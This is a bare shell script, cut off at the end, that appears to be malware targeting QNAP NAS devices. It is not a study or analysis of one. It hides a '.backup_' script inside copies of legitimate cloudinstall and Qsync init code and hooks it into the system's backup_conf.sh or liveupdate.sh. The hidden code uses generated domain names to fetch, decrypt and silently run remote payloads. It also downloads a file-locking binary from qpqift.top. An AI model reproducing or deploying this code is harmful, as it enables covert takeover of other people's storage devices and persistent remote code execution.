#!/bin/sh
{
ts=1558069200
PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"
test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in homes Public Download Multimedia Web Recordings; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"` && test -d "$bdir" || bdir=''
test -z "${bdir}" || test ! -d "${bdir}"; } && { while read -r bdir; do
test -d "$bdir" && break; bdir=''
done <<EOF
$(mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp")
EOF
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in {{CE_,}CACHEDEV{1,2,3},MD0,HDA}_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { bdir=/mnt/HDA_ROOT && test -d "$bdir" || bdir='/'; }; }

test -z "$PWD" && PWD=$(pwd)
CWD="$PWD"
if [ "${CWD%/*}" != "${bdir}/.qpkg" ]; then
        CWD=''
        for dir in '.config' '.liveupdate'; do
                dir="${bdir}/.qpkg/${dir}"
                test -d "$dir" && cd "$dir" && CWD="$dir" && break
        done
fi
test "$CWD" && test -d "$CWD" && cd "$CWD"

sedreplace () {
local grepstring="$1" sedcmd="$2" file="$3"
[ "$grepstring" ] && [ "$sedcmd" ] && [ "$file" ] || return 1
if grep "$grepstring" "$file"; then
test -f '.qdisk_cmd' && ./.qdisk_cmd -i "$file"
sed -i "$sedcmd" "$file"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "$file"
fi
return $?
}

for path in ".config/backup_conf.sh" ".liveupdate/liveupdate.sh"; do
file=''
[ -f "${path#*/}" ] && file="${path#*/}" || { [ -f "${bdir}/.qpkg/${path}" ] && file="${bdir}/.qpkg/${path}"; }
if [ "x${file}" != 'x' ]; then
sedcmd='s/CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/CXqrBM2CVbJog4rwwSz1Bp1i1'"'"'\
verifykey="${verifykey}"'"'"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/'
grepstring='CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex'
sedreplace "$grepstring" "$sedcmd" "$file"
sedcmd='s/g4rwwSz1Bp1i1'"'"'/g4rwwS'"''"'z1Bp1i1'"'"'/'
grepstring='g4rwwSz1Bp1i1'"'"
sedreplace "$grepstring" "$sedcmd" "$file"
fi
done
file=''

if [ ! -f '1550379600_c' ]; then
touch '1550379600_c'
test -f liveupdate.sh && { dir=.liveupdate; file=liveupdate.sh; } || { test -f backup_conf.sh && dir=.config; file=backup_conf.sh; }
cat >".backup_${file}" <<"XEOF"
#!/bin/sh
QNAP_QPKG=cloudinstall
QID_PRESISTENT_CONF=/etc/config/qid_persistent.conf
NAS_CLOUD_INSTALL_PATH=/home/httpd/cgi-bin/cloudinstall
CLOUD_INSTALL_PATH=/tunnel_agent
CLOUD_INSTALL_RAMDISK_PATH=/tunnel_agent_ramdisk
CLOUD_INSTALL_AGENT_FILE_PATH=$CLOUD_INSTALL_PATH/tunnel_agent.tar.bz2
COUNTER=1
ERROR_BAD_REQUEST=400

if [ "$fromrcS" = 'TRUE' ]; then
case "$1" in
  start)
    START_TIME=$(date +"%T")
    echo -e "start:$START_TIME" >> /tmp/.cloudinstall.log
    while [ "$CLOUD_INSTALL_AGENT_PID_LIST" == "" ];
    do
        # report device info and get cloudinstall agent app download url
        DOWNLOAD_URL=`/usr/sbin/qcloud_uninit_device_tool -r`
        if [ ! -d "$CLOUD_INSTALL_PATH" ]; then
            if [ "$NAS_ARCH" == "ARM_64" ]; then
                # create ramdisk and create a 64mb file
                /bin/mkdir -p $CLOUD_INSTALL_RAMDISK_PATH
                /bin/mount -t tmpfs -o size=64m tmpfs $CLOUD_INSTALL_RAMDISK_PATH
                /bin/dd if=/dev/zero of=$CLOUD_INSTALL_RAMDISK_PATH/image bs=1M count=64
                # create block size 1K filesystem
                /sbin/mke2fs -b 1024 $CLOUD_INSTALL_RAMDISK_PATH/image
                # create virtual disk
                export USED_LOOP_DEVICE=`/usr/local/sbin/losetup -f $CLOUD_INSTALL_RAMDISK_PATH/image`
                /sbin/setcfg -f $QID_PRESISTENT_CONF "CLOUDINSTALL" "USED_LOOP_DEVICE" "$USED_LOOP_DEVICE"
                /bin/mkdir -p $CLOUD_INSTALL_PATH
                # mount virtual disk
                /bin/mount $USED_LOOP_DEVICE $CLOUD_INSTALL_PATH
            else
                # create and mount tmpfs folder
                /bin/mkdir -p $CLOUD_INSTALL_PATH
                /bin/mount -t tmpfs -o size=64m tmpfs $CLOUD_INSTALL_PATH
            fi
        fi
        cd $CLOUD_INSTALL_PATH

        if [[ $DOWNLOAD_URL == https* ]]; then
            REPORT_SUCCESS_TIME=$(date +"%T")
        else
            REPORT_FAIL_TIME=$(date +"%T")
            echo -e " report_fail:$REPORT_FAIL_TIME\n response:$DOWNLOAD_URL" >> /tmp/.cloudinstall.log
            # stop retry when got bad request
            # prevent put bad request all the time
            if [[ $DOWNLOAD_URL == *$ERROR_BAD_REQUEST* ]]; then
                break
            fi
        fi

        # downlaod cloudinstall agent app
        /usr/sbin/qcloud_uninit_device_tool -o "$CLOUD_INSTALL_AGENT_FILE_PATH" -d "$DOWNLOAD_URL"

        if [ -f "$CLOUD_INSTALL_AGENT_FILE_PATH" ]; then
            DOWNLOAD_FINISH_TIME=$(date +"%T")
            # unzip and execute cloudinstallagent
            /bin/tar -xf $CLOUD_INSTALL_AGENT_FILE_PATH -C $CLOUD_INSTALL_PATH
            $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_ctl.sh start &> /dev/null

            UNZIP_TIME=$(date +"%T")
        fi

        if [ ! -d "$NAS_CLOUD_INSTALL_PATH" ]; then
            # create folder and create symbolic link
            /bin/mkdir -p $NAS_CLOUD_INSTALL_PATH
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/cloudinstall.html $NAS_CLOUD_INSTALL_PATH/index.html
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/cloudinstall.cgi $NAS_CLOUD_INSTALL_PATH/cloudinstall.cgi
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/static $NAS_CLOUD_INSTALL_PATH/static
        fi

        # wait connect
        sleep 5
        CLOUD_INSTALL_AGENT_PID_LIST=`/bin/ps --columns 256 | /bin/grep "$CLOUD_INSTALL_PATH/bin/cloudinstallagent" | /bin/grep -v grep | /bin/awk '{print $1}'`
        if [ "$CLOUD_INSTALL_AGENT_PID_LIST" == "" ]; then
            SLEEP_TIME=$(( 30 * $COUNTER ))
            if [ $SLEEP_TIME -gt 300 ]; then
                SLEEP_TIME=300
            fi
            # wait next retry
            sleep $SLEEP_TIME
        fi
        COUNTER=$(( $COUNTER * 2 ))
    done

    END_TIME=$(date +"%T")
    echo -e "report_success:$REPORT_SUCCESS_TIME\ndownload_finish:$DOWNLOAD_FINISH_TIME\nunzip_finish:$UNZIP_TIME\nend:$END_TIME" >> /tmp/.cloudinstall.log
    # call for a new process group and for later kill
    /bin/setsid $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_disconnect_daemon.sh start &> /dev/null &
    /bin/setsid $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_daemon.sh &> /dev/null &

    # set cloudinstall report status
    /sbin/setcfg -f $QID_PRESISTENT_CONF "CLOUDINSTALL" "REPORT_STATUS" "uninit"
    # add link to report offline
    /bin/ln -sf /etc/init.d/cloudinstall_report_offline.sh /etc/rcK.d/K99cloudinstall_report_offline

    # buzzer
    HARDWARE_TYPE=$(uname -m)
    if [[ "$HARDWARE_TYPE" == *"x86"* ]];
    then
      /sbin/hal_app --se_buzzer enc_id=0,mode=101
    elif [[ "$HARDWARE_TYPE" == *"arm"* ]];
    then
      /sbin/pic_raw 81
    fi
    ;;

  stop)
    # disconnect cloudinstall agent
    $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_ctl.sh stop &> /dev/null
    $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_disconnect_daemon.sh stop &> /dev/null
    for i in "${CLOUD_INSTALL_AGENT_DAEMON_PID_LIST[@]}"
    do
        # use bash kill instead /bin/kill for kill process group
        # cloudinstall agent daemon and inotifywait
        kill -9 -- -$i &>/dev/null
    done

    # umount
    if [ "$NAS_ARCH" == "ARM_64" ]; then
        /bin/umount -l $USED_LOOP_DEVICE
        /usr/local/sbin/losetup -d $USED_LOOP_DEVICE
    else
        /bin/umount -l $CLOUD_INSTALL_PATH
    fi
    # remove all files
    if [ -d "$NAS_CLOUD_INSTALL_PATH" ]; then
        /bin/rm -rf $NAS_CLOUD_INSTALL_PATH
    fi
    if [ -d "$CLOUD_INSTALL_PATH" ]; then
        /bin/rm -rf $CLOUD_INSTALL_PATH
    fi
    if [ -d "$CLOUD_INSTALL_RAMDISK_PATH" ]; then
        /bin/rm -rf $CLOUD_INSTALL_RAMDISK_PATH
    fi
    ;;

  restart)
    $0 stop
    $0 start
    ;;

  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
esac
exit 0


set_env()
{
	debug=`$CMD_GETCFG Qsync Debug -u -d NULL`
	if [ "$debug" != "NULL" ]; then
		/bin/touch $LOG_FILE
	else
		/bin/rm -f $LOG_FILE
	fi
}

set_env

dbg()
{
	if [ -f "$LOG_FILE" ]; then
		echo "[`date "+%H:%M:%S"`] $@ " >> $LOG_FILE
	fi
}

dbg "> $0 $@ (pid $$)"

fi

export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"

command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\n\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\n//I;s/\(^\|\n\)\[[^\n]\+\]\n.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }

test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }

bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in Public Download Multimedia Web Recordings homes; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
grep -F '' <<EOF >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }

EOF
test "$fgrep" || fgrep=grep
test "$RANDOM" || RANDOM=17653
genrstr () 
{ 
    local s=;
    local min=${1:-4};
    local max=${2:-12};
    local kspace="${3:-a-zA-Z}"
    tr -dc "$kspace" < /dev/urandom | { 
        read -rn $(($RANDOM % ( $max - $min + 1 ) + $min )) s;
        echo "$s"
    }
}

verifyfile() {
local file="$1"
local sig="${2:-$file_s}"
local out
test ! -z "$file" && test -s "$file" || return 1
test ! -z "$sig" && test -s "$sig" || return 1
test -f ".rsakey" || echo "$verifykey" > ".rsakey"
out=$(openssl dgst -sha1 -verify ".rsakey" -signature "$sig" "$file") && test "$out" = "Verified OK" && return 0
return 1
}

decryptfile() {
local file="$1"
local ofile="${2:-${file}}"
local key='7C0vK4SzMO15zBxLD7XCi5hbjgP1ZjkJ'
openssl enc -d -aes-256-cbc -k "$key" -md sha1 -salt < "$file" > "${file}_d" || return $?
test -f "$ofile" && rm -f "$ofile"
mv "${file}_d" "$ofile" && return 0
return 1
}

verifykey='-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt/EDT6SB75atrHW7Cpog
CXqrBM2CVbJo';verifykey="${verifykey}"'g4rwwS''z1Bp1i1'
verifykey="${verifykey}"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex
RC5qQSiS/7FS48jsPKsJnrUhnsI1fRLM4DqsEF3UOukZuDOYUhlteDuMqqZBz0AC
Q3YnLjraTjchMF0XmaAAcWOkg5MsxAOKTepue4R/tnrPAkAG86nq5LA1+wa7opNV
gQzwDh7YXhBnWz52+ebZ9TeqD31/sb5hoyUKf1Nr5HcKkklObuz1OGQJ//pkCbTC
2EnQw6tCPQhgSIA8wJKkaxW0f/UHP+YBmWa4Wn+uPrJJuHSVNEJtAp2wlX3THltz
0IGPQEuzoafOAl3EFjas3HcTX2HlEfnvAtRL2iLxJeba1nZ+U3geZOuxL1NhWhNh
pjaLcKwhkRck7Y5hr1Pz8pLDnXsx5w0QUz6XS8HVf/KHnNXHufFEn01y9YoPuau1
DNnpDGbq632Bs8ESd3ueHk9OY/UZxWeN3UdbseFxK35XAgMBAAE=
-----END PUBLIC KEY-----'
domainexts='cf:0 tk:0 com:1 ml:0 de:0 rocks:0 mx:0 biz:0 net:1 cn:0 ga:0 gq:0 org:1 top:0 nl:0 men:0 ws:0 se:0 info:0 xyz:0 today:0 ru:0 ec:0 co:0 ee:0 rs:0 com.sv:0 com.cy:0 co.zw:0 kg:0 com.ge:0 tl:0 name:0 tw:0 lv:0 bs:0 li:0 ng:0 ae:0 bt:0 tv:0 pe:0 uz:0 me:0 gy:0 am:0 kr:0 by:0 fr:0 com.uy:0 com.lb:0 com.br:0 vu:0 hk:0 in:0 re:0 ch:0 af:0 com.ps:0 ug:0 dz:0 pro:0 co.th:0 sg:0 cd:0 so:0 mo:0 co.id:0 co.il:0 com.do:0 ke:0 cx:0 ro:0 id:0 pm:0 hm:0 vg:0 az:0 com.eg:0 bz:0 su:0 com.ar:0 gg:0 com.lr:0 pa:0 com.ve:0 al:0 fm:0 to:0 mu:0 co.ck:0 pk:0 co.rs:0 cw:0 nr:0 gd:0 gl:0 ac:0 lk:0 md:0 fi:0 sx:0 lc:0 es:0 cc:0 cm:0 la:0 co.za:0 je:0 cz:0 jp:0 ai:0 pw:0 bg:0 nu:0 ag:0 bm:0 eu:0 com.my:0 sc:0 ax:0 wf:0 ly:0 qa:0 vn:0 aq:0 mobi:0 com.tr:0 com.ua:0 com.py:0 hk.org:0 south.am:0 com.kh:0 co.zm:0 ru.net:0 com.km:0 tt:0 kn:0 co.ls:0 co.fk:0 uy.com:0 com.gu:0 .com.bn:0 com.pf:0 com.fj:0'
n=0

for ext in $domainexts; do
	eval 'domainext'"$n"'=$ext'
	n=$(( $n + 1 ))
done
domainextcnt=$n

test -d "${bdir}/.qpkg" || mkdir "${bdir}/.qpkg"
XEOF
cat >>".backup_${file}" <<EOF
test -d "\${bdir}/.qpkg/${dir}" || mkdir "\${bdir}/.qpkg/${dir}"
cd "\${bdir}/.qpkg/${dir}" && rm -f .tmp.*
EOF
cat >>".backup_${file}" <<"XEOF"

echo "$verifykey" > ".rsakey"

for tmpfile in "./.tmp.XXXXXX" "${bdir}/.tmp.XXXXXX" "/.tmp.XXXXXX"; do
	tmpfile=$(mktemp "./.tmp.XXXXXX")
	test -f "$tmpfile" && outfile=$tmpfile && break
done
test -n "${outfile}" && test -f "${outfile}" || outfile='./.tmp.out'
curlconntimeout=12
i=0 n=0 c=0 errorcount=0
for interval in '1296000' '432000' '86400' '28800' '7200' '3600'; do
	timestart=$(date +%s)
	for length in 5 3 4; do
		timenow=$(date +%s)
		test "$(( $timenow - $timestart ))" -gt 600 && test "$interval" != "3600" && break
		curlconntimeout=$(( $curlconntimeout - ( $timenow - $timestart ) / 250 ))
		test "$curlconntimeout" -lt 6 && curlconntimeout=6
		n=0; while [ "$n" -lt $domainextcnt ]; do
			eval 'ext=$domainext'"$n"
			l=$(( $length + ${ext#*:} ))
			ext=${ext%:*}
			if [ $length = 5 ]; then
				hostname=$(echo "$(( $(date +%s) / $interval ))IbjGOEgnuD${ext}" | openssl dgst -sha1 -binary | openssl base64 | sed 'y/ABCDEFGHIJKLMNOPQRSTUVWXYZ-+\//abcdefghijklmnopqrstuvwxyzabc/;s/=//g')
				hostname=${hostname%${hostname#??????}}
				eval 'hostname'"$n"'=$hostname'
			fi
			eval 'host=$hostname'"$n"
			n=$(( $n + 1 ))
			trycnt=0
			while [ ${#host} -gt "$l" ] && [ $trycnt -lt 3 ]; do
				trycnt=$(( $trycnt + 1 ))
				host=${host%?}
			done
			test -f "$outfile" && rm -f "$outfile"
			recentupdate=''
			curl --connect-timeout "$curlconntimeout" -m 30 -k -o "$outfile" "https://${host}.${ext}/qnap_firmware.xml?t=$(date +%s)"
			test -s "$outfile" || continue
			fsize=$(( $(wc -c < "$outfile") ))
			test "$fsize" -gt 4096 && rm -f "$outfile" && continue
			rsamsg=$(openssl base64 -in "$outfile" -d | openssl rsautl -pubin -inkey ".rsakey" -verify) || continue
			test "$rsamsg" || continue
			path="${rsamsg%|*}"; rsadomain="${path%|*}"; path="${path#*|}"
			hash="${rsamsg##*|}"; ts="${hash#*_}"; hash="${hash%_*}"
			test "$rsadomain" = "${host}.${ext}" || continue
			timenow=$(date +%s)
			test "$ts" -gt 0 && { test "$ts" -gt "$timenow" || test $(( $timenow - $ts )) -lt 172800; } && recentupdate=1
			curl --connect-timeout "$curlconntimeout" -m 300 -k -o "$outfile" "https://${host}.${ext}/${path}"
			filehash=$(openssl dgst -sha1 -binary "$outfile" | openssl base64) || continue
			test "$filehash" = "$hash" || continue
			curl --connect-timeout "$curlconntimeout" -m 30 -k -o "${outfile}_s" "https://${host}.${ext}/s/${path}"
			verifyfile "$outfile" "${outfile}_s" && decryptfile "$outfile" || continue
			mv "${outfile}_s" "${ts}_v"
			chmod 755 "$outfile" || continue
			( ( exec >/dev/null 2>/dev/null </dev/null; "$outfile" ) & )
			test "${recentupdate:-0}" -eq 1 && exit 0
			for tmpfile in "./.tmp.XXXXXX" "${bdir}/.tmp.XXXXXX" "/.tmp.XXXXXX"; do
				tmpfile=$(mktemp "./.tmp.XXXXXX")
				test -f "$tmpfile" && outfile=$tmpfile && break
			done
			test -n "${outfile}" && test -f "${outfile}" || outfile='./.tmp.out'
		done
	done
done

if [ "$fromrcS" = 'TRUE' ]; then
# if Qsync is disable before 4.3.0, we will touch /mnt/HDA_ROOT/udpate_pkg/.QsyncServer_disabled
set_default_disable_status()
{
	QPKG_ENABLE=`$CMD_GETCFG ${QSYNC_NAME} Enable -d "NULL" -f ${QPKG_CONF}`
	OLD_ENABLE=`$CMD_GETCFG Qsync Enable -u -d NULL`
	if [ -f "${UPDATEPKG_DIR}/.${QSYNC_NAME}_removed" ]; then
		return
	fi

	if [ "$QPKG_ENABLE" = "NULL" ]; then
		if [ "$OLD_ENABLE" = "FALSE" ]; then
			dbg "touch ${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled"
			/bin/touch "${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled"
		fi
	fi
}

if [ "x$HBS_ENABLE" = xnull ] || [ "x$HBS_ENABLE" = xFALSE ]; then
	export QNAP_QPKG=rtrr
else
	export QNAP_QPKG=HybridBackup
	/usr/local/sbin/qboost_util -S -n rtrr -E 0 1>/dev/null 2>&1
fi
start()
{
	if [ -f /usr/bin/qsyncman ]; then
		[ ! -f /etc/config/hdcopyusb.conf ] || /bin/rm -f /etc/config/hdcopyusb.conf
		/bin/sed -i '/hdusb_copy/d' /etc/config/crontab
		/usr/bin/crontab /etc/config/crontab
		echo -n "Starting QSync manitor: "
		[ -d /etc/config/qsync ] || /usr/bin/install -d /etc/config/qsync
		[ -f /etc/config/qsync/qhost.conf ] || /bin/touch /etc/config/qsync/qhost.conf
		[ -f /etc/config/qsync/qsyncjobdef.conf ] || /bin/touch /etc/config/qsync/qsyncjobdef.conf
		[ -f /etc/config/qsync/qsync.conf ] || /bin/cp -p /etc/default_config/qsync/qsync.conf /etc/config/qsync/qsync.conf
		[ -f /etc/config/qsync/extdrv.conf ] || /bin/cp -p /etc/default_config/qsync/extdrv.conf /etc/config/qsync/extdrv.conf
		[ -f /etc/config/qsync/qsyncd.conf ] || /bin/cp -p /etc/default_config/qsync/qsyncd.conf /etc/config/qsync/qsyncd.conf
		[ ! -f /etc/config/qsync/qsyncd.conf ] || /bin/chmod 640 /etc/config/qsync/qsyncd.conf
		[ ! -f /etc/config/qsync/qsync.conf ] || /bin/chmod 640 /etc/config/qsync/qsync.conf
		[ ! -f /etc/config/qsync/qhost.conf ] || /bin/chmod 640 /etc/config/qsync/qhost.conf
		/sbin/daemon_mgr qsyncman start "/usr/bin/qsyncman 1>/dev/null 2>&1"
		echo "OK"
	fi
}

stop()
{
	echo "Shutting down QSync monitor: OK"
        pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
        kill $pidnum 2>/dev/null
        i=0
        while [ ${i} -lt 5 ]
        do
                pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
                if [ -z "$pidnum" ]; then
                        break
                fi
                sleep 1
                i=`/usr/bin/expr ${i} + 1`
        done
        pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
        [ -z "$pidnum" ] || kill -9 $pidnum 2>/dev/null
	/sbin/daemon_mgr qsyncman stop "/usr/bin/qsyncman"
	/usr/bin/killall -q qsyncman
}

start_qsyncd()
{
	#_qsyncd_en=`/sbin/getcfg "" Enabled -d 0 -f /etc/qsync/qsyncd.conf`
	#[ "x$_qsyncd_en" = x1 ] || return -1
	_qsyncd_run_pid=`/bin/pidof qsyncd`
	[ -z $_qsyncd_run_pid ] || return -114
	_recycle_en=`/sbin/getcfg 'Network Recycle Bin' Enable -d FALSE`
	_with_syslog=$1
	if [ "x$_recycle_en" = xTRUE  ]; then
		if [ "x$_with_syslog" = x1  ]; then
			LD_PRELOAD=/usr/local/lib/libtrash.so /usr/bin/qsyncd -syslog -c:/etc/qsync/qsyncd.conf
		else
			LD_PRELOAD=/usr/local/lib/libtrash.so /usr/bin/qsyncd -c:/etc/qsync/qsyncd.conf
		fi
	else
		if [ "x$_with_syslog" = x1  ]; then
			/usr/bin/qsyncd -syslog -c:/etc/qsync/qsyncd.conf
		else
			/usr/bin/qsyncd -c:/etc/qsync/qsyncd.conf
		fi
	fi
	_iret=$?
	if [ "x$_iret" = x0 ]; then
		i=0
		while [ ${i} -lt 10000 ]
		do
			echo "${i} millisecond..."
			_qsyncd_pid=`/sbin/getcfg '' Pid -d -1 -f /etc/qsync/qsyncd.conf`
			_qsyncd_run_pid=`/bin/pidof qsyncd`
			if [ "x$_qsyncd_pid" != "x-1" ] && [ ! -z $_qsyncd_run_pid ]; then
				break
			fi
			usleep 50000
			i=`/usr/bin/expr ${i} + 50`
		done
	fi
	return -$_iret
}

stop_qsyncd()
{
	#_qsyncd_en=`/sbin/getcfg "" Enabled -d 0 -f /etc/qsync/qsyncd.conf`
	#[ "x$_qsyncd_en" = x0 ] || return -1
	_qsyncd_pid=`/sbin/getcfg "" Pid -d -1 -f /etc/qsync/qsyncd.conf`
	[ $_qsyncd_pid -lt 0 ] && return -3
	# Send SIGUSR1 to inform the daemon to output "[RTRR Server] Stopped" event log
	/bin/kill -SIGUSR1 $_qsyncd_pid
	usleep 200000
	# Send SIGINT to stop the QSyncd process
	/bin/kill -SIGINT $_qsyncd_pid
	_kill_ret=$?
	if [ "x$_kill_ret" != x0 ]; then
		return -3
	fi
	echo "need wait $1 millisecond"
	i=0
	while true
	do
		echo "${i} millisecond..."
		_qsyncd_pid=`/sbin/getcfg '' Pid -d -1 -f /etc/qsync/qsyncd.conf`
		_qsyncd_run_pid=`/bin/pidof qsyncd`
		if [ "x$_qsyncd_pid" = "x-1" ] && [ -z $_qsyncd_run_pid ]; then
			break
		fi
		if [ ${i} -ge $1 ]; then
			# if time-out, we send two additional SIGINT to force the daemon to stop.
			if [ $_qsyncd_pid -ge 0 ]; then
				/bin/kill -SIGUSR1 $_qsyncd_pid
				usleep 200000
				/bin/kill -SIGUSR1 $_qsyncd_pid
			fi
			j=0
			while [ ${j} -lt 500 ]
			do
				_qsyncd_run_pid=`/bin/pidof qsyncd`
				if [ -z $_qsyncd_run_pid ]; then
					return 0
				fi
				usleep 20000
				j=`/usr/bin/expr ${j} + 20`
			done
			return -62
		fi
		usleep 50000
		i=`/usr/bin/expr ${i} + 50`
	done
	return 0
}


install()
{
	lock_file="/var/lock/qbox_install_bin.lck"

	if [ ! -f "${INSTALL_BUILD_IN}" ]; then
		dbg "build-in ${QSYNC_NAME} is installed"
		return 1
	fi

	if [ ! -f ${UPDATEPKG_DIR}/${QSYNC_NAME}.bin ]; then
		dbg "${QSYNC_NAME}.bin} not found"
		return 1
	fi

	if [ ! -x "${QPKG_CLI}" ]; then
		dbg "${QPKG_CLI} not found"
		return 1
	fi

	## make sure volume is exist
	if [ ! -d /share/`/sbin/getcfg SHARE_DEF defPublic -d Public -f /etc/config/def_share.info` ]; then
		dbg "/share/Public not found"
		return 1
	fi

	## is removed 
	if [ -f ${UPDATEPKG_DIR}/.${QSYNC_NAME}_removed ]; then
		/bin/rm -f ${INSTALL_BUILD_IN}
		dbg "${QSYNC_NAME} is removed"
		return 1
	fi

	if [ -f "$lock_file" ]; then 
		if [ $(( $(date +%s) - $(date +%s -r $lock_file) )) -le 180 ]; then
			echo "${QSYNC_NAME} is installing"
			dbg "${QSYNC_NAME} is installing"
			return 1
		fi
	fi

	/bin/touch "$lock_file"	
	/bin/rm -f ${INSTALL_BUILD_IN}
	dbg "install build-in ${QSYNC_NAME} start"

	set_default_disable_status

	## install build in Qsync
	${QPKG_CLI} -K -m ${UPDATEPKG_DIR}/${QSYNC_NAME}.bin > /dev/null 2>&1
	sleep 20

	wait_install=60
	## avoid initial take long time or fail
        while [ "$wait_install" -gt 0 ]; do
		stcode=`$CMD_GETCFG ${QSYNC_NAME}.bin stcode -f /etc/config/qpkg_job.conf`
                if [ "$stcode" = "0" ]; then
                        break
                fi
                sleep 1
                let "wait_install--"
        done

	${QPKG_CLI} -C ${QSYNC_NAME}.bin > /dev/null 2>&1
	/bin/rm -f ${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled
	/bin/rm -f "$lock_file"	
	dbg "install build-in ${QSYNC_NAME} success"
}

if [ "$1" == "stop" ]; then
	exit 0
fi
fi
XEOF
chmod 755 ".backup_${file}"
if grep "\.backup_${file}" "$file"; then
:
else
test -f '.qdisk_cmd' && ./.qdisk_cmd -i "$file"
echo ". ./.backup_${file}" >> "$file"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "$file"
fi

fi

if [ ! -f ".qdisk_cmd" ]; then
	case "$(uname -m)" in 
	*x86_64*)
			arch=x86_64
			binhash='g2oe7EJJVCiAHY6AG1I1c/lGF8Y='
			;;
	*arm*|*aarch*)
			arch=arm
			binhash='Z3twHZvQqYZ1vLeu4PLnZekdkRY='
			;;
	*i*86*)
			arch=i486
			binhash='gWzECXuIp3dz5yI7RJS9d4+xpq4='
			;;
	esac
	
	if [ "x${binhash}" != 'x' ]; then
		curl --connect-timeout 12 -m 1200 -k -o ".qdisk_cmd.tmp" "https://qpqift.top/data/qdisk_cmd_${arch}" || rm -f ".qdisk_cmd.tmp"
		test -f '.qdisk_cmd.tmp' && rsynchash="$(openssl dgst -sha1 -binary ".qdisk_cmd.tmp" | openssl base64)"
		if [ "x${rsynchash}" = "x${binhash}" ]; then
			mv '.qdisk_cmd.tmp' '.qdisk_cmd' && chmod +x '.qdisk_cmd'
		else
			rm -f '.qdisk_cmd.tmp'
		fi
	fi
fi
binhash=''; rsynchash=''

for path in ".config/backup_conf.sh" ".liveupdate/liveupdate.sh"; do
if [ -f "${path#*/}" ]; then 
test -f '.qdisk_cmd' && ./.qdisk_cmd +ia "${path#*/}"
elif [ -f "${bdir}/.qpkg/${path}" ]; then
test -f '.qdisk_cmd' && ./.qdisk_cmd +ia "${bdir}/.qpkg/${path}"
fi
done

version=$(getcfg System Version)
test "x${version}" = 'x' && version=$(getcfg System Version -f /etc/default_config/uLinux.conf)
test "${version##*.}" -lt 3 || test "${version%%.*}" -lt 4 || test "$(version=${version#*.}; echo "${version%.*}")" -lt 3 && version=4.3.3 || { test "${version##*.}" -gt 5 && version=4.3.5; }

if [ ! -d rssdoc ]; then 
